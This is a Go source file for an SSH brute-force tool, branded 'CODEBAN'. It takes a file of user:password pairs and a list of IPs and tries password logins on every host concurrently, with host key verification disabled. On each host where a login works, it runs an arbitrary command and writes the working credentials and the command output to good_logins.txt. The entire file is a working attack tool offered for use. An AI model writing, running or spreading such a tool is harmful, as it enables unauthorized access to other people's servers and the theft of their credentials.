package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"

	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
)

var (
	ipSegmentFlag  CIDRFlag
	ipUserPairs    = make(map[string]*connectionStatus)
	ipUserPairsMu  sync.Mutex
	wg             sync.WaitGroup
	allowedIPRange *net.IPNet
)

type connectionStatus struct {
	Good bool
	Bad  bool
	// Add more status fields if needed
}

const (
	TimeoutSeconds = 5
)

type CustomError struct {
	Message string
}

func (e *CustomError) Error() string {
	return e.Message
}

func NewCustomError(message string) *CustomError {
	return &CustomError{Message: message}
}

// CIDRFlag is a custom type to hold CIDR notation for IP filtering
type CIDRFlag struct {
	CIDR string
}

func (c *CIDRFlag) String() string {
	return c.CIDR
}

func (c *CIDRFlag) Set(value string) error {
	c.CIDR = value
	_, ipNet, err := net.ParseCIDR(value)
	if err != nil {
		return err
	}
	allowedIPRange = ipNet
	return nil
}

func init() {
	flag.Var(&ipSegmentFlag, "S", "Filter IP segments in CIDR notation (e.g., 1.1.0.0/24)")
}

func createSSHSession(ip, username, port, password string) (*ssh.Session, error) {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%s", ip, port), config)
	if err != nil {
		return nil, NewCustomError(fmt.Sprintf("Error creating SSH session for %s@%s:%s", username, ip, port))
	}

	session, err := client.NewSession()
	if err != nil {
		return nil, NewCustomError(fmt.Sprintf("Error creating SSH session for %s@%s:%s", username, ip, port))
	}

	return session, nil
}

func isNoLogin(err error) bool {
	if err != nil {
		if strings.Contains(err.Error(), "permission denied") {
			return true
		}
		// Add other checks based on expected behavior
	}
	return false
}

func checkConnectionForIP(user, pass, command, ip, port string) {
	defer wg.Done()

	if allowedIPRange != nil {
		ipAddr := net.ParseIP(ip)
		if ipAddr == nil || !allowedIPRange.Contains(ipAddr) {
			// Skip IP if it's not valid or not in the allowed range
			return
		}
	}

	session, err := createSSHSession(ip, user, port, pass)
	if err != nil {
		if isNoLogin(err) {
			handleNoLogin(ip, user, pass, port)
		} else {
			// Ignore other errors
			return
		}
	}
	defer func() {
		if session != nil {
			session.Close()
		}
	}()

	var output []byte
	output, err = session.CombinedOutput(command)
	if err != nil {
		if isNoLogin(err) {
			handleNoLogin(ip, user, pass, port)
		} else {
			// Ignore other errors
			return
		}
		return
	}

	handleGoodConnection(ip, user, pass, output, port)
}

func checkVPS(userpassFile, command, ipListFile, port string, threads int) {
	upf, err := os.Open(userpassFile)
	if err != nil {
		handleError(NewCustomError(fmt.Sprintf("Passfile - %s", err)))
		return
	}
	defer upf.Close()

	semaphore := make(chan struct{}, threads)

	printBanner()
	fmt.Printf("\n\n\033[01;34m[\033[01;31m▶\033[01;34m] \033[01;34mBrute Started\033[0m\n\n")

	scanner := bufio.NewScanner(upf)
	for scanner.Scan() {
		userPass := scanner.Text()
		parts := strings.SplitN(userPass, ":", 2)
		if len(parts) == 2 {
			user := parts[0]
			pass := parts[1]

			fmt.Printf("\033[01;34m[\033[0m %s \033[01;34m]\033[0m - \033[01;34m[\033[0m %s \033[01;34m]\033[0m\n", user, pass)

			ipf, err := os.Open(ipListFile)
			if err != nil {
				handleError(NewCustomError(fmt.Sprintf("IP List - %s", err)))
				continue
			}
			defer ipf.Close()

			scannerIP := bufio.NewScanner(ipf)
			var ipBatch []string
			for scannerIP.Scan() {
				ip := scannerIP.Text()
				ipBatch = append(ipBatch, ip)

				// Print user and pass combination
				fmt.Printf("[ %s ] - [ %s ]\n", user, pass)

				// When the batch size is reached, process the batch concurrently
				if len(ipBatch) == threads {
					processIPBatch(user, pass, command, port, ipBatch, semaphore)
					ipBatch = nil
				}
			}

			// Process the remaining IPs in the last batch
			if len(ipBatch) > 0 {
				processIPBatch(user, pass, command, port, ipBatch, semaphore)
			}
		} else {
			warningMessage := fmt.Sprintf("Warn - Invalid user:pass format: %s\n", userPass)
			color.Cyan(warningMessage)
		}
	}

	// Wait for all goroutines to finish
	wg.Wait()

	// Display the colored completion message
	fmt.Println("\n\033[01;34m[\033[01;31m      -- Finished --     \033[01;34m]\033[0m")
}

func processIPBatch(user, pass, command, port string, ipBatch []string, semaphore chan struct{}) {
	// Acquire semaphore
	semaphore <- struct{}{}
	wg.Add(1)
	go func(user, pass, command, port string, ipBatch []string) {
		defer wg.Done()
		defer func() {
			// Release semaphore
			<-semaphore
		}()
		for _, ip := range ipBatch {
			checkConnectionForIP(user, pass, command, ip, port)
		}
	}(user, pass, command, port, ipBatch)
}

func printBanner() {
	fmt.Println("\033[01;34m╔══════════════════════════════════════════════════╗")
	fmt.Println("\033[01;34m║\033[01;31m                  C O D E B A N                   \033[01;34m║")
	fmt.Println("\033[01;34m╚══════════════════════════════════════════════════╝")
}

func handleError(err error) {
	errorMessage := fmt.Sprintf("\n\t\t\033[31mC O\033[33m D E \033[096mB A N\033[0m\n\n\033[01;34m[ \033[01;31m-\033[01;34m ] \033[01;31mError \033[0m- %s\n", err)
	color.Cyan(errorMessage)
}

func countLines(filename string) (int, error) {
	file, err := os.Open(filename)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	count := 0
	for scanner.Scan() {
		count++
	}

	return count, scanner.Err()
}

func handleGoodConnection(ip, user, pass string, output []byte, port string) {
	fmt.Printf("[ Good ] [ %s ] - [ %s ] [ %s ] [ %s ]\n", user, ip, pass, port)
	fmt.Printf("Command Output: %s\n", output)
	vulnf, err := os.OpenFile("good_logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		handleError(NewCustomError("Failed to open good_logins.txt"))
		return
	}
	defer vulnf.Close()

	ipUserPairsMu.Lock()
	defer ipUserPairsMu.Unlock()

	ipKey := fmt.Sprintf("%s:%s", ip, port)

	if _, exists := ipUserPairs[ipKey]; !exists {
		ipUserPairs[ipKey] = &connectionStatus{}
	}
	ipUserPairs[ipKey].Good = true

	logToFile(vulnf, fmt.Sprintf("[ Good ] | %s@%s %s\nCommand Output: %s", user, ip, pass, output))
}

func handleNoLogin(ip, user, pass, port string) {
	fmt.Printf("[ NoLogin ] [ %s ] - [ %s ] [ %s ] [ %s ]\n", user, ip, pass, port)
	vulnf, err := os.OpenFile("nologin_logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		handleError(NewCustomError("Failed to open nologin_logins.txt"))
		return
	}
	defer vulnf.Close()

	ipUserPairsMu.Lock()
	defer ipUserPairsMu.Unlock()

	ipKey := fmt.Sprintf("%s:%s", ip, port)

	if _, exists := ipUserPairs[ipKey]; !exists {
		ipUserPairs[ipKey] = &connectionStatus{}
	}
	ipUserPairs[ipKey].Bad = true

	logToFile(vulnf, fmt.Sprintf("[ NoLogin ] | %s@%s %s", user, ip, pass))
}

func logToFile(file *os.File, logEntry string) {
	if _, err := file.WriteString(logEntry + "\n"); err != nil {
		handleError(NewCustomError("Failed to write to log file"))
	}
}

func main() {
	// Usage message with information about the -S option
	usage := "Usage: ./brute <userpass file> <custom command> <ip list file> <port> <threads> [-S <IP segment>]"

	// Parse command line arguments
	flag.Parse()

	// Check if the number of arguments is correct
	if flag.NArg() != 5 {
		handleError(NewCustomError(usage))
		os.Exit(1)
	}

	// Extract command line arguments
	userpassFile := flag.Arg(0)
	command := flag.Arg(1)
	ipListFile := flag.Arg(2)
	port := flag.Arg(3)
	threads, err := strconv.Atoi(flag.Arg(4))
	if err != nil {
		handleError(NewCustomError("Invalid thread count"))
		os.Exit(1)
	}

	// Parse the IP segment provided with the -S option
	if ipSegmentFlag.CIDR != "" {
		// Use ipSegmentFlag.CIDR directly
		_, ipNet, err := net.ParseCIDR(ipSegmentFlag.CIDR)
		if err != nil {
			handleError(NewCustomError("Invalid IP segment format"))
			os.Exit(1)
		}
		allowedIPRange = ipNet
	}

	// Perform the VPS check with the specified parameters
	checkVPS(userpassFile, command, ipListFile, port, threads)
}
